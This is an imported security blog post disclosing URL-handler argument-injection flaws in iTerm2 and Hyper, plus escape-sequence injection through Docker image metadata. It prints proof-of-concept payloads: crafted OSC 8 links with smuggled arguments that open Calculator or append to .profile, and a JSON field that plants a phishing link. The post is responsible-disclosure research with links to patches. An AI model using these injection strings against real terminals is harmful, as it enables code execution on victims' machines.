---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-05-21_abusing-url-handling-in-iterm2-and-hyper-for-code-execution.md
original_filename: 2024-05-21_abusing-url-handling-in-iterm2-and-hyper-for-code-execution.md
title: Abusing url handling in iTerm2 and Hyper for code execution
category: documents
detected_topics:
- command-injection
- supply-chain
tags:
- imported
- documents
- command-injection
- supply-chain
language: en
raw_sha256: da7dfe339f656a8e5d26b03903f22220848b277f049bf35481143959e763acd0
text_sha256: f586b2332a953f8ddc111538e2cbee6eb8a12b1ec2c9307e988ef1e183c39286
ingested_at: '2026-06-28T07:32:33Z'
sensitivity: unknown
redactions_applied: false
---

# Abusing url handling in iTerm2 and Hyper for code execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-05-21_abusing-url-handling-in-iterm2-and-hyper-for-code-execution.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain
- Ingested At: 2026-06-28T07:32:33Z
- Redactions Applied: False
- Raw SHA256: `da7dfe339f656a8e5d26b03903f22220848b277f049bf35481143959e763acd0`
- Text SHA256: `f586b2332a953f8ddc111538e2cbee6eb8a12b1ec2c9307e988ef1e183c39286`


## Content

---
title: "Abusing url handling in iTerm2 and Hyper for code execution"
page_title: "Abusing url handling in iTerm2 and Hyper for code execution | Vin01’s Blog"
url: "https://vin01.github.io/piptagole/escape-sequences/iterm2/hyper/url-handlers/code-execution/2024/05/21/arbitrary-url-schemes-terminal-emulators.html"
final_url: "https://vin01.github.io/piptagole/escape-sequences/iterm2/hyper/url-handlers/code-execution/2024/05/21/arbitrary-url-schemes-terminal-emulators.html"
authors: ["Vin01"]
programs: ["iTerm2", "Vercel (Hyper)"]
bugs: ["RCE", "Escape sequence injection"]
publication_date: "2024-05-21"
added_date: "2024-07-15"
source: "pentester.land/writeups.json"
original_index: 283
---

# Abusing url handling in iTerm2 and Hyper for code execution

May 21, 2024 

## What are escape sequences

Modern terminals are very capable tools with quite extended support for various [escape sequences](https://en.wikipedia.org/wiki/ANSI_escape_code). These escape sequences are specially treated by terminal emulators to generate colors, cursor styles, cliboard access and even _*wink*_ hyperlinks!

A few examples of commonly used escape sequences:

Change title of the terminal window to `new-title`:
  
  
  $ echo -e "\e]2;new-title\a"
  

Ring a bell:
  
  
  $ echo -e "\a"
  

## Hyperlinks in terminals

[Most terminal emulators](https://github.com/Alhadis/OSC8-Adoption) these days allow using `Osc 8` to directly generate hyperlinks from arbitrary text.

Typically it looks something like following:
  
  
  echo -e '\033]8;;http://example.com\033\\This is a link\033]8;;\033\\\n'
  

It is just like HTML `<a>` element, right in our terminals.

## Arbitrary url schemes

Browsers have been improving(?) over time and now mostly show a pop up to open external programs if a link uses non-standard url schemes like `ssh://`, `ftp://`, `x-man-page://` etc.

A pop-up after clicking a `ssh://` link in a rendered HTML page looks something like this:

![Dialog box](/piptagole/assets/browser_warn.png)

However, in most terminal emulators, the links are opened directly in whichever program registered to handle that url scheme i.e. an SSH client for `ssh://` urls.

## Terminal emulators as url scheme handlers

The default MacOS terminal registers various url scheme handlers on OS X. Any links using those schemes when clicked, would open the MacOS terminal to perform the corresponding action.

e.g. `telnet`, `x-man-page`, `ssh`, `whois`

You can view the information about url schemes registered on your OS X system using:
  
  
  /System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump | grep -B3 bindings:.*:
  

[iTerm2](https://iterm2.com/news.html) similarly allows selecting various url schemes to be handled by itself. The vulnerabilities I am going to share affected the handling of two such url schemes by iTerm2 and one by Vercel’s Hyper.

## Vulnerability #1

Handling of `x-man-page://` url scheme by iTerm2 was vulnerable to code execution through argument injection.

PoC:
  
  
  'x-man-page://foo -P"open -aCalculator"'
  

OSC 8 version to generate the exploit link from terminal itself which when clicked would pop a calculator:
  
  
  echo -e '\e]8;;x-man-page://foo%00-P%22open%20-aCalculator%22\e\\This is a link\e]8;;\e\\'
  

![iterm2 vuln1](/piptagole/assets/iterm21.png)

Patch: [https://gitlab.com/gnachman/iterm2/-/commit/de3d351](https://gitlab.com/gnachman/iterm2/-/commit/de3d351e1bd3bc1c1a4f85fe976c592e497dd071)

[CVE-2023-46321](https://www.cvedetails.com/cve/CVE-2023-46321/)

## Vulnerability #2

Handling of `ssh://` url scheme by iTerm2 was vulnerable to argument injection allowing arbitrary file write.

PoC:
  
  
  echo -e '\e]8;;ssh://-E.profile/`launch-calc`\e\This is a link\e]8;;\e\'
  

This would append following content to the victim’s `.profile`:
  
  
  ssh: Could not resolve hostname cd /`launch-calc`; exec $shell -l: nodename nor servname provided, or not known^M
  

And once sourced, it would execute the `launch-calc` command allowing a somewhat delayed limited code execution. Injecting a more elaborate payload might also be possible, not just a single command. Also abusing SSH flags like `-F` to provide a config file, an attacker could also abuse an already existing local file on the target’s device to achieve the same.

Patch: [https://gitlab.com/gnachman/iterm2/-/commit/ef7bb84](https://gitlab.com/gnachman/iterm2/-/commit/ef7bb84520013b2524df9787d4aa9f2c96746c01)

[CVE-2023-46322](https://www.cvedetails.com/cve/CVE-2023-46322/), the patch has been released in version [3.5.0](https://iterm2.com/downloads.html)

## Vulnerability #3

[Hyper](https://hyper.is/) when installed, registers itself as the handler of `ssh://` url schemes. Luckily this feature is [broken](https://github.com/vercel/hyper/pull/7170) in `3.4.1` but works in canary versions since `4.0.0-canary4`.

Failed PoC for lulz:
  
  
  echo -e '\e]8;;ssh://example.com&open%20-aCalculator/\e\This is a link\e]8;;\e\'
  

But of course, thanks to url encoding this does not work and we encounter:
  
  
  bash: open%20-aCalculator: command not found
  

(same for `ssh://example.com&open -aCalculator/` of course because the space automatically gets converted to url encoded version)

`IFS` for the rescue!

Successful PoC:
  
  
  echo -e '\e]8;;ssh://example.com&open$IFS-aCalculator/\e\This is a link\e]8;;\e\'
  

![Hyper code execution](/piptagole/assets/hyper.png)

Patch: <https://github.com/vercel/hyper/pull/7615>

# Bonus vulnerability, bad moby!

What better tool to inject arbitrary text containing escape sequences (and hence hyperlinks) into our terminal emulators than Docker?

I created a simple docker image using only one instruction in the Dockerfile i.e. `FROM alpine:latest`, exported it to tar, modified the json metadata to contain following `architecture` value to create a new image:
  
  
  {"architecture":") not found ..\n\n\u001B]8;;https://example.com\u0007Please click this link to install latest docker client.\u001B]8;;\u0007\n\n", ...
  

This is of course a harmless PoC and you can try it out using `docker pull vin01/escape-seq-test:latest --platform darwin/arm64` or `docker run --rm vin01/escape-seq-test` and you should see the injected link as shown below.

![bad mody 1](/piptagole/assets/bad-moby.png)

![bad mody 2](/piptagole/assets/bad-moby-2.png)

This was disclosed to Docker in August last year but is still unpatched and in combination with [other vulnerabilities](https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce) in terminal emulators may be leveraged as an easy attack vector to abuse.

# Other weaknesses

I also came across a couple more issues in iTerm2 which were handled in a timely manner and fixed very quickly.

  * [RemoteHost escape sequence](https://gitlab.com/gnachman/iterm2/-/commit/d1ca91e0e795479da889ff4318921b517997de6a)
  * [Window title buffer overflow](https://gitlab.com/gnachman/iterm2/-/commit/baa60a93309e71befbe378f116f6b03a90bf75dd)

# More research in weaponizing escape sequences

Shoutout to [solid-snail](https://github.com/solid-snail) for uncovering another flaw in iTerm2: [From Terminal Output to Arbitrary Remote Code Execution](https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce)

And to [STÖK](https://x.com/stokfredrik) for [Weaponizing Plain Text ANSI Escape Sequences as a Forensic Nightmare](https://www.youtube.com/watch?v=3T2Al3jdY38)

# Disclosures and thanks

  * Thanks to Vercel team for handling it under their responsible disclosure program and the swag.
  * Thanks to George Nachman for maintaining iTerm2 and handling vulnerability reports.

Exploring a similar attack vector on Linux and Windows terminals might also be worthwhile.

**Upgrade to iTerm2 3.5.0** : <https://iterm2.com/downloads.html>

[How to donate to iTerm2](https://iterm2.com/donate.html)

[](/piptagole/escape-sequences/iterm2/hyper/url-handlers/code-execution/2024/05/21/arbitrary-url-schemes-terminal-emulators.html)
